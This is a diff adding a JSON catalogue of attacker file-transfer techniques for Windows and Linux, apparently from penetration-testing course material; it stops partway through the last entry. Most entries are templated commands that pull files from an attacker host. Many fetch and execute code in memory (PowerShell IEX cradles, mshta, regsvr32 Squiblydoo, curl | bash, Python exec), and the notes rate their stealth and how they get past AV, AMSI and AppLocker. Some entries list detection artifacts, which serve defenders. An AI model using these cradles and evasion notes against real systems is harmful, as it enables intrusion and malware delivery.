@@ -1,0 +1,2106 @@
+{
+  "techniques": [
+    {
+      "id": "ps_iwr",
+      "label": "PowerShell \u2014 Invoke-WebRequest",
+      "command": "Invoke-WebRequest http://{ip}:{port}/{filename} -OutFile {win_out} -UseBasicParsing",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Modern PowerShell (3.0+). The -UseBasicParsing flag prevents 'IE not configured' errors on fresh installs. UA contains 'WindowsPowerShell' so easily flagged by network monitoring.",
+      "ua": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x",
+      "references": [
+        {
+          "label": "MS Docs \u2014 Invoke-WebRequest",
+          "url": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "PowerShell 3.0+ available and HTTP outbound works. Default modern Windows download.",
+      "source": "htb"
+    },
+    {
+      "id": "ps_webclient",
+      "label": "PowerShell \u2014 Net.WebClient.DownloadFile",
+      "command": "(New-Object Net.WebClient).DownloadFile('http://{ip}:{port}/{filename}','{win_out}')",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Works across all PowerShell builds (older boxes too). Faster than Invoke-WebRequest. File saved to disk \u2014 AV will scan on write.",
+      "ua": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x",
+      "references": [
+        {
+          "label": "MS Docs \u2014 Net.WebClient",
+          "url": "https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient"
+        },
+        {
+          "label": "Harmj0y \u2014 PowerShell cradles",
+          "url": "https://gist.github.com/HarmJ0y/bb48307ffa663256e239"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "Any PowerShell version (works on legacy boxes where IWR fails). HTTP outbound works.",
+      "source": "htb"
+    },
+    {
+      "id": "ps_iex_cradle",
+      "label": "PowerShell \u2014 IEX cradle",
+      "command": "IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/{filename}')",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "fileless",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Classic fileless cradle. Script content lives only in memory, never touches disk. Only works for PowerShell scripts (.ps1), not binaries. AMSI inspects the content though, so signatures still apply.",
+      "ua": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x",
+      "artifacts": "AMSI inspects script body in memory; PS ScriptBlock log",
+      "references": [
+        {
+          "label": "Harmj0y \u2014 PowerShell cradles",
+          "url": "https://gist.github.com/HarmJ0y/bb48307ffa663256e239"
+        },
+        {
+          "label": "MS Docs \u2014 Invoke-Expression",
+          "url": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "You only need to RUN a PS script, not save it. Avoids disk writes (no AV scan on disk).",
+      "source": "htb"
+    },
+    {
+      "id": "ps_msxml2",
+      "label": "PowerShell \u2014 Msxml2.XMLHTTP cradle",
+      "command": "$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','http://{ip}:{port}/{filename}',$false); $h.send(); IEX $h.responseText",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "fileless",
+        "stealth",
+        "srv:http"
+      ],
+      "notes": "Same outcome as the IEX cradle but uses a different COM object \u2014 User-Agent looks like Internet Explorer 7, not PowerShell. Best stealth for PowerShell-based downloads.",
+      "ua": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0)",
+      "artifacts": "Same AMSI/ScriptBlock logging as IEX \u2014 content scanned",
+      "references": [
+        {
+          "label": "Harmj0y \u2014 PowerShell cradles",
+          "url": "https://gist.github.com/HarmJ0y/bb48307ffa663256e239"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "Stealth matters \u2014 UA looks like IE7. Use when WindowsPowerShell UA would get flagged.",
+      "source": "community"
+    },
+    {
+      "id": "ps_bitstransfer",
+      "label": "PowerShell \u2014 Start-BitsTransfer",
+      "command": "Import-Module bitstransfer; Start-BitsTransfer -Source 'http://{ip}:{port}/{filename}' -Destination '{win_out}'",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Uses Background Intelligent Transfer Service. Resumes interrupted downloads automatically. UA: 'Microsoft BITS/7.8' \u2014 easy to spot on the network.",
+      "ua": "Microsoft BITS/7.8",
+      "process": "svchost.exe (BITS service)",
+      "artifacts": "BITS Operational Log Event 59/60/61 (URL); qmgr.db",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Bitsadmin",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"
+        },
+        {
+          "label": "MS Docs \u2014 BITS PowerShell cmdlets",
+          "url": "https://learn.microsoft.com/en-us/powershell/module/bitstransfer/"
+        },
+        {
+          "label": "Harmj0y \u2014 PowerShell cradles",
+          "url": "https://gist.github.com/HarmJ0y/bb48307ffa663256e239"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "ps_iwr_cradle",
+      "label": "PowerShell \u2014 iwr IEX cradle (PS 3.0+)",
+      "command": "IEX (iwr 'http://{ip}:{port}/{filename}')",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "fileless",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Shorter PS 3.0+ alias for the IEX cradle using Invoke-WebRequest (this is the form in harmj0y's gist). On fresh installs you may need to add -UseBasicParsing to avoid the IE-not-configured error. Same UA and detectability as IWR \u2014 'WindowsPowerShell' in the User-Agent.",
+      "ua": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x",
+      "references": [
+        {
+          "label": "Harmj0y \u2014 PowerShell cradles",
+          "url": "https://gist.github.com/HarmJ0y/bb48307ffa663256e239"
+        },
+        {
+          "label": "MS Docs \u2014 Invoke-WebRequest",
+          "url": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "ps_iecom",
+      "label": "PowerShell \u2014 InternetExplorer.Application COM",
+      "command": "$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://{ip}:{port}/{filename}');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "fileless",
+        "stealth",
+        "srv:http"
+      ],
+      "notes": "Spawns a real (hidden) Internet Explorer process to fetch the URL. The User-Agent on the wire is the actual installed IE's UA (typically IE11 on Win10/11) \u2014 most stealthy of the COM cradles. Downsides: slow (5-sec sleep), flaky if IE first-launch isn't complete, IE COM is being phased out.",
+      "references": [
+        {
+          "label": "Harmj0y \u2014 PowerShell cradles",
+          "url": "https://gist.github.com/HarmJ0y/bb48307ffa663256e239"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "community"
+    },
+    {
+      "id": "ps_winhttp",
+      "label": "PowerShell \u2014 WinHttp.WinHttpRequest cradle",
+      "command": "$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://{ip}:{port}/{filename}',$false);$h.send();iex $h.ResponseText",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "fileless",
+        "medium",
+        "srv:http"
+      ],
+      "notes": "Medium-stealth IEX cradle using the WinHttp COM object. UA reveals the WinHttp library, not PowerShell. Note: NOT proxy-aware (skips system proxy settings).",
+      "ua": "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
+      "references": [
+        {
+          "label": "Harmj0y \u2014 PowerShell cradles",
+          "url": "https://gist.github.com/HarmJ0y/bb48307ffa663256e239"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "community"
+    },
+    {
+      "id": "ps_dnstxt",
+      "label": "PowerShell \u2014 DNS TXT cradle",
+      "command": "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt \"{ip}\" | Select -Pattern '\"*\"') -split '\"'[0]))))",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "fileless",
+        "stealth"
+      ],
+      "notes": "Payload encoded as base64 in a DNS TXT record, fetched via nslookup. No HTTP traffic at all \u2014 bypasses HTTP-only egress filters. Replace {ip} with the domain that serves the TXT record. Originally from PowerBreach.",
+      "references": [
+        {
+          "label": "Harmj0y \u2014 PowerShell cradles",
+          "url": "https://gist.github.com/HarmJ0y/bb48307ffa663256e239"
+        },
+        {
+          "label": "PowerBreach (origin)",
+          "url": "https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1"
+        }
+      ],
+      "source": "community"
+    },
+    {
+      "id": "cmd_curl_win",
+      "label": "cmd \u2014 curl (Windows 10+)",
+      "command": "curl http://{ip}:{port}/{filename} -o {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "tool",
+        "download",
+        "medium",
+        "srv:http"
+      ],
+      "notes": "Real curl is bundled with Windows 10 (build 17063+) and Windows 11. Cleanest cmd-native syntax.",
+      "ua": "curl/8.x.x",
+      "references": [
+        {
+          "label": "curl docs",
+          "url": "https://curl.se/docs/manpage.html"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "community"
+    },
+    {
+      "id": "cmd_certutil",
+      "label": "cmd \u2014 certutil -urlcache",
+      "command": "certutil -urlcache -split -f http://{ip}:{port}/{filename} {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Classic Windows LOLBIN. AMSI/Defender flags this in modern environments but works in less-monitored contexts. UA: 'Microsoft-CryptoAPI/10.0' \u2014 easy to detect on the network.",
+      "ua": "Microsoft-CryptoAPI/10.0",
+      "artifacts": "Cache in CryptnetUrlCache\\; Defender Event ID 1116",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Certutil",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+        },
+        {
+          "label": "ThinkDFIR \u2014 Certutil download artefacts",
+          "url": "https://thinkdfir.com/2020/07/30/certutil-download-artefacts/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "PowerShell is blocked but cmd.exe works. Caveat: AMSI flags this in modern environments.",
+      "source": "htb"
+    },
+    {
+      "id": "cmd_bitsadmin",
+      "label": "cmd \u2014 bitsadmin /transfer",
+      "command": "bitsadmin /transfer wcb /priority foreground http://{ip}:{port}/{filename} {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Background Intelligent Transfer Service via cmd. Resumes interrupted downloads. UA: 'Microsoft BITS/7.8'. Marked deprecated by Microsoft in favor of PowerShell BITS cmdlets.",
+      "ua": "Microsoft BITS/7.8",
+      "process": "svchost.exe (BITS service)",
+      "artifacts": "BITS Operational Log Event 59/60/61 (URL); qmgr.db",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Bitsadmin",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"
+        },
+        {
+          "label": "MS Docs \u2014 bitsadmin",
+          "url": "https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "PowerShell blocked, certutil flagged. BITS is built-in and often less monitored.",
+      "source": "htb"
+    },
+    {
+      "id": "win_desktopimgdownldr",
+      "label": "cmd \u2014 Desktopimgdownldr",
+      "command": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://{ip}:{port}/{filename} /eventName:desktopimgdownldr",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Windows 10 wallpaper-download utility abused as downloader. Uses BITS COM under the hood \u2014 actual TCP comes from svchost. File lands in lockscreen image cache; move/rename after. Useful when standard download tools blocked.",
+      "ua": "Microsoft BITS/7.8",
+      "process": "svchost.exe (BITS service)",
+      "artifacts": "BITS Operational Log Event 59/60/61 (URL)",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Desktopimgdownldr",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/"
+        },
+        {
+          "label": "SentinelLabs \u2014 downldr writeup",
+          "url": "https://www.sentinelone.com/labs/living-off-windows-land-a-new-native-file-downldr/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "community"
+    },
+    {
+      "id": "win_mshta",
+      "label": "cmd \u2014 mshta from URL",
+      "command": "mshta http://{ip}:{port}/{filename}",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "fileless",
+        "stealth",
+        "srv:http"
+      ],
+      "notes": "Executes HTA file from URL in memory. Filename should end in .hta and contain HTML+VBS/JS. Microsoft-signed binary \u2014 often allowed by AppLocker. Used in many APT chains.",
+      "artifacts": "Process tree: mshta.exe with HTTP URL on cmdline",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Mshta",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+        },
+        {
+          "label": "MITRE T1218.005 \u2014 Mshta",
+          "url": "https://attack.mitre.org/techniques/T1218/005/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "community"
+    },
+    {
+      "id": "win_squiblydoo",
+      "label": "cmd \u2014 regsvr32 Squiblydoo",
+      "command": "regsvr32 /s /n /u /i:http://{ip}:{port}/{filename} scrobj.dll",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "fileless",
+        "medium",
+        "srv:http"
+      ],
+      "notes": "Squiblydoo bypass. Filename must be a .sct (COM scriptlet) containing JS or VBS. Classic AppLocker bypass. Now blocked by default Defender ASR rules in modern Windows \u2014 works on unmanaged endpoints.",
+      "artifacts": "regsvr32.exe loading scrobj.dll + outbound URL on cmdline",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Regsvr32",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"
+        },
+        {
+          "label": "MITRE T1218.010 \u2014 Regsvr32",
+          "url": "https://attack.mitre.org/techniques/T1218/010/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "community"
+    },
+    {
+      "id": "win_cscript_js",
+      "label": "cscript \u2014 wget.js (JavaScript)",
+      "command": "REM === Save the following as wget.js ===\nvar WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n\nREM === Then run: ===\ncscript.exe /nologo wget.js http://{ip}:{port}/{filename} {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "language",
+        "download",
+        "medium",
+        "srv:http"
+      ],
+      "notes": "JavaScript download cradle via cscript. Uses ActiveX (WinHttp.WinHttpRequest + ADODB.Stream) to fetch and save the URL. cscript.exe is Microsoft-signed and rarely AppLocker-blocked. Used in the Astaroth APT chain.",
+      "ua": "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
+      "references": [
+        {
+          "label": "SuperUser \u2014 original wget.js answer",
+          "url": "https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068"
+        },
+        {
+          "label": "LOLBAS \u2014 Cscript",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Cscript/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "win_cscript_vbs",
+      "label": "cscript \u2014 wget.vbs (VBScript)",
+      "command": "REM === Save the following as wget.vbs ===\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n\nREM === Then run: ===\ncscript.exe /nologo wget.vbs http://{ip}:{port}/{filename} {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "language",
+        "download",
+        "stealth",
+        "srv:http"
+      ],
+      "notes": "VBScript download cradle via cscript. Same ActiveX approach as the JS version (Microsoft.XMLHTTP + ADODB.Stream). VBScript has been on every Windows since 98 \u2014 useful when JS is blocked but VBS isn't.",
+      "references": [
+        {
+          "label": "StackOverflow \u2014 original wget.vbs answer",
+          "url": "https://stackoverflow.com/questions/2973136/download-a-file-with-vbs"
+        },
+        {
+          "label": "Wikipedia \u2014 VBScript",
+          "url": "https://en.wikipedia.org/wiki/VBScript"
+        },
+        {
+          "label": "LOLBAS \u2014 Cscript",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Cscript/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_curl",
+      "label": "curl",
+      "command": "curl -o {nix_out} http://{ip}:{port}/{filename}",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "medium",
+        "srv:http"
+      ],
+      "notes": "Universal HTTP client on most Linux distros. Lowercase -o sets output path.",
+      "ua": "curl/8.x.x",
+      "references": [
+        {
+          "label": "curl docs",
+          "url": "https://curl.se/docs/manpage.html"
+        },
+        {
+          "label": "GTFOBins \u2014 curl",
+          "url": "https://gtfobins.org/gtfobins/curl/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "Modern Linux with curl installed. Default first try.",
+      "source": "htb"
+    },
+    {
+      "id": "linux_wget",
+      "label": "wget",
+      "command": "wget http://{ip}:{port}/{filename} -O {nix_out}",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "medium",
+        "srv:http"
+      ],
+      "notes": "The other universal Linux HTTP client. Uppercase -O sets output path (different from curl).",
+      "ua": "Wget/1.21.x",
+      "references": [
+        {
+          "label": "wget manual",
+          "url": "https://www.gnu.org/software/wget/manual/wget.html"
+        },
+        {
+          "label": "GTFOBins \u2014 wget",
+          "url": "https://gtfobins.org/gtfobins/wget/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "curl is missing but wget is installed (e.g., older distros).",
+      "source": "htb"
+    },
+    {
+      "id": "linux_curl_bash",
+      "label": "curl | bash",
+      "command": "curl http://{ip}:{port}/{filename} | bash",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "fileless",
+        "medium",
+        "srv:http"
+      ],
+      "notes": "Linux fileless cradle. Pipes the downloaded script directly into bash for execution. Nothing hits disk. Works for any shell script.",
+      "ua": "curl/8.x.x",
+      "references": [
+        {
+          "label": "curl docs",
+          "url": "https://curl.se/docs/manpage.html"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "You only need to EXECUTE a script, not save it. Fileless \u2014 bypasses on-disk AV scans.",
+      "source": "htb"
+    },
+    {
+      "id": "linux_devtcp",
+      "label": "bash /dev/tcp",
+      "command": "exec 3<>/dev/tcp/{ip}/{port}; echo -e \"GET /{filename} HTTP/1.0\\r\\nHost: {ip}\\r\\n\\r\\n\" >&3; cat <&3 > {nix_out}; sed -i '1,/^\\r\\?$/d' {nix_out}",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "stealth",
+        "srv:http"
+      ],
+      "notes": "Last resort \u2014 bash itself can do TCP. Includes sed cleanup to strip HTTP headers. Slow but works on stripped systems with bash 2.04+ (Alpine, distroless, hardened boxes).",
+      "references": [
+        {
+          "label": "Bash man page (/dev/tcp)",
+          "url": "https://www.gnu.org/software/bash/manual/bash.html#Redirections"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "Last resort \u2014 curl, wget, python all missing. Bash 2.04+ has TCP built in (Alpine, distroless).",
+      "source": "htb"
+    },
+    {
+      "id": "linux_busybox",
+      "label": "busybox wget",
+      "command": "busybox wget http://{ip}:{port}/{filename} -O {nix_out}",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "medium",
+        "srv:http"
+      ],
+      "notes": "Use when on Alpine or busybox-only container. busybox's multi-call binary provides a minimal wget when GNU wget is missing.",
+      "references": [
+        {
+          "label": "BusyBox docs",
+          "url": "https://busybox.net/downloads/BusyBox.html"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "community"
+    },
+    {
+      "id": "linux_socat",
+      "label": "socat \u2014 TCP file pull",
+      "command": "socat -u TCP:{ip}:{port} OPEN:{nix_out},creat",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "stealth",
+        "srv:socat"
+      ],
+      "notes": "Alternative to nc with more flexibility. Server side: socat -u OPEN:{filename} TCP-LISTEN:{port},reuseaddr",
+      "references": [
+        {
+          "label": "socat man page",
+          "url": "http://www.dest-unreach.org/socat/doc/socat.html"
+        },
+        {
+          "label": "GTFOBins \u2014 socat",
+          "url": "https://gtfobins.org/gtfobins/socat/"
+        }
+      ],
+      "usage": "socat -u OPEN:{filename} TCP-LISTEN:{port},reuseaddr",
+      "source": "community"
+    },
+    {
+      "id": "linux_ncat_ssl",
+      "label": "ncat \u2014 TLS-encrypted",
+      "command": "ncat --ssl {ip} {port} > {nix_out}",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "stealth",
+        "srv:ncat-ssl"
+      ],
+      "notes": "TLS-wrapped nc. Use when traffic inspection is a concern. Server: ncat --ssl --send-only -lnvp {port} < {filename}",
+      "references": [
+        {
+          "label": "ncat \u2014 Nmap docs",
+          "url": "https://nmap.org/ncat/guide/"
+        }
+      ],
+      "usage": "ncat --ssl --send-only -lnvp {port} < {filename}",
+      "source": "community"
+    },
+    {
+      "id": "linux_python3",
+      "label": "Python 3 \u2014 urllib",
+      "command": "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://{ip}:{port}/{filename}\",\"{nix_out}\")'",
+      "meta": [
+        "cross",
+        "language",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Use when curl and wget are missing. Python 3 is on most modern Linux. Note: target needs python3 installed (check with 'which python3').",
+      "ua": "Python-urllib/3.x",
+      "references": [
+        {
+          "label": "Python urllib.request docs",
+          "url": "https://docs.python.org/3/library/urllib.request.html"
+        },
+        {
+          "label": "GTFOBins \u2014 python",
+          "url": "https://gtfobins.org/gtfobins/python/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_python3_fileless",
+      "label": "Python 3 \u2014 exec from URL",
+      "command": "python3 -c \"import urllib.request,sys; exec(urllib.request.urlopen('http://{ip}:{port}/{filename}').read())\"",
+      "meta": [
+        "cross",
+        "language",
+        "download",
+        "fileless",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Equivalent of the PowerShell IEX cradle for Python scripts. Downloads and exec()s in memory. Works for any Python source code, on any OS with python3 installed.",
+      "ua": "Python-urllib/3.x",
+      "references": [
+        {
+          "label": "Python urllib.request docs",
+          "url": "https://docs.python.org/3/library/urllib.request.html"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_python2",
+      "label": "Python 2 \u2014 urllib (legacy)",
+      "command": "python2.7 -c 'import urllib;urllib.urlretrieve(\"http://{ip}:{port}/{filename}\",\"{nix_out}\")'",
+      "meta": [
+        "cross",
+        "language",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Python 2 reached EOL in 2020 but you'll still find it on legacy boxes. Note the slightly different API: 'urllib' (not 'urllib.request') and 'urlretrieve' lives directly on urllib.",
+      "ua": "Python-urllib/2.7",
+      "references": [
+        {
+          "label": "Python 2 urllib docs",
+          "url": "https://docs.python.org/2/library/urllib.html"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_php",
+      "label": "PHP \u2014 file_get_contents",
+      "command": "php -r '$f = file_get_contents(\"http://{ip}:{port}/{filename}\"); file_put_contents(\"{nix_out}\", $f);'",
+      "meta": [
+        "cross",
+        "language",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "PHP is installed on most web servers. Reads the entire file into memory \u2014 bad for files > a few MB. Use the fopen variant for streaming.",
+      "ua": "PHP/x.x.x",
+      "references": [
+        {
+          "label": "PHP file_get_contents",
+          "url": "https://www.php.net/manual/en/function.file-get-contents.php"
+        },
+        {
+          "label": "GTFOBins \u2014 php",
+          "url": "https://gtfobins.org/gtfobins/php/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "You compromised a web server already running PHP. Use what is already there.",
+      "source": "htb"
+    },
+    {
+      "id": "linux_php_fileless",
+      "label": "PHP \u2014 @file pipe to bash",
+      "command": "php -r '$l = @file(\"http://{ip}:{port}/{filename}\"); foreach ($l as $i => $x) { echo $x; }' | bash",
+      "meta": [
+        "linux",
+        "bash",
+        "language",
+        "download",
+        "fileless",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "PHP fileless cradle \u2014 fetches a shell script and pipes straight to bash. Useful when you have RCE on a web server but no curl/wget.",
+      "ua": "PHP/x.x.x",
+      "references": [
+        {
+          "label": "PHP file()",
+          "url": "https://www.php.net/manual/en/function.file.php"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_ruby",
+      "label": "Ruby \u2014 Net::HTTP",
+      "command": "ruby -e 'require \"net/http\"; File.write(\"{nix_out}\", Net::HTTP.get(URI.parse(\"http://{ip}:{port}/{filename}\")))'",
+      "meta": [
+        "cross",
+        "language",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Ruby ships on macOS and many Linux distros (especially anything with Metasploit, Rails, or Chef). Built-in net/http \u2014 no gems needed.",
+      "ua": "Ruby",
+      "references": [
+        {
+          "label": "Ruby Net::HTTP docs",
+          "url": "https://docs.ruby-lang.org/en/master/Net/HTTP.html"
+        },
+        {
+          "label": "GTFOBins \u2014 ruby",
+          "url": "https://gtfobins.org/gtfobins/ruby/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_perl",
+      "label": "Perl \u2014 LWP::Simple",
+      "command": "perl -e 'use LWP::Simple; getstore(\"http://{ip}:{port}/{filename}\", \"{nix_out}\");'",
+      "meta": [
+        "cross",
+        "language",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Cleanest Perl one-liner. Requires LWP::Simple module \u2014 present on most Perl installs but missing from minimal perl-base. If unavailable, fall back to raw IO::Socket::INET.",
+      "ua": "libwww-perl/6.x",
+      "references": [
+        {
+          "label": "LWP::Simple \u2014 metacpan",
+          "url": "https://metacpan.org/pod/LWP::Simple"
+        },
+        {
+          "label": "GTFOBins \u2014 perl",
+          "url": "https://gtfobins.org/gtfobins/perl/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "curl/wget/python missing but Perl is installed (older Unix-style boxes).",
+      "source": "htb"
+    },
+    {
+      "id": "linux_node",
+      "label": "Node.js \u2014 http.get",
+      "command": "node -e 'require(\"http\").get(\"http://{ip}:{port}/{filename}\", r => r.pipe(require(\"fs\").createWriteStream(\"{nix_out}\")))'",
+      "meta": [
+        "cross",
+        "language",
+        "download",
+        "stealth",
+        "srv:http"
+      ],
+      "notes": "Node.js is common on dev/CI/build boxes. Uses built-in http module \u2014 no npm packages needed. For HTTPS, swap require('http') for require('https').",
+      "references": [
+        {
+          "label": "Node.js http module",
+          "url": "https://nodejs.org/api/http.html"
+        },
+        {
+          "label": "GTFOBins \u2014 node",
+          "url": "https://gtfobins.org/gtfobins/node/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "community"
+    },
+    {
+      "id": "cross_base64",
+      "label": "base64 paste-through",
+      "command": "# === On attacker (Linux) ===\ncat {filename} | base64 -w 0; echo\n\n# === On Windows target ===\n[IO.File]::WriteAllBytes(\"{win_out}\", [Convert]::FromBase64String(\"PASTE_BASE64_HERE\"))\n\n# === On Linux target ===\necho -n 'PASTE_BASE64_HERE' | base64 -d > {nix_out}\n\n# Verify both sides:\n# Linux:    md5sum {filename}\n# Windows:  Get-FileHash {win_out} -Algorithm MD5",
+      "meta": [
+        "cross",
+        "tool",
+        "download",
+        "stealth"
+      ],
+      "notes": "When no network transfer works. Encode on one side, paste through the shell, decode on the other. Limit: cmd.exe has 8191-char line max so files >~500KB will be truncated.",
+      "references": [
+        {
+          "label": "md5sum man page",
+          "url": "https://man7.org/linux/man-pages/man1/md5sum.1.html"
+        }
+      ],
+      "when": "No network at all \u2014 only terminal access (web shell, blind RCE). Files under ~500KB only.",
+      "source": "htb"
+    },
+    {
+      "id": "cross_xxd",
+      "label": "xxd hex paste-through",
+      "command": "# === On attacker ===\nxxd -p {filename} | tr -d '\\n'; echo\n\n# === On target ===\necho 'PASTE_HEX_HERE' | xxd -r -p > {nix_out}\n\n# Verify both sides with md5sum",
+      "meta": [
+        "cross",
+        "tool",
+        "download",
+        "stealth"
+      ],
